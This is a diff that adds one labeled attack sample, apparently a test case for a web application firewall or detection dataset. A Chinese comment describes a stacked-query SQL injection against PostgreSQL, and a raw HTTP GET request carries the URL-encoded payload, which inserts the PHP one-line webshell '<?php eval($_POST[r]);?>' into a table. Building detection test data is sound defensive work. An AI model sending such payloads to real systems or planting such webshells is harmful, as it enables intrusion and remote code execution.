@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506348
+# 攻击者基于堆叠查询，将"insert into hacker_shell values ('<?php eval($_POST[r]);?>')"语句注入到 SQL 查询参数中，目的是使用insert into语句向特定表中写入一句话木马。
+GET /?id=1%3Binsert%20into%20hacker_shell%20values%20%28%27%3C%3Fphp%20eval%28$_POST%5Br%5D%29%3B%3F%3E%27%29&bid=hd_tag_m8mv23yw HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23yw
+RM-PRO-Token: 2778c45b77a6ce91f6973db7af6c8ffb
+RM-PRO-Time: 1742808353479
+User-Agent: curl/7.83.1
+
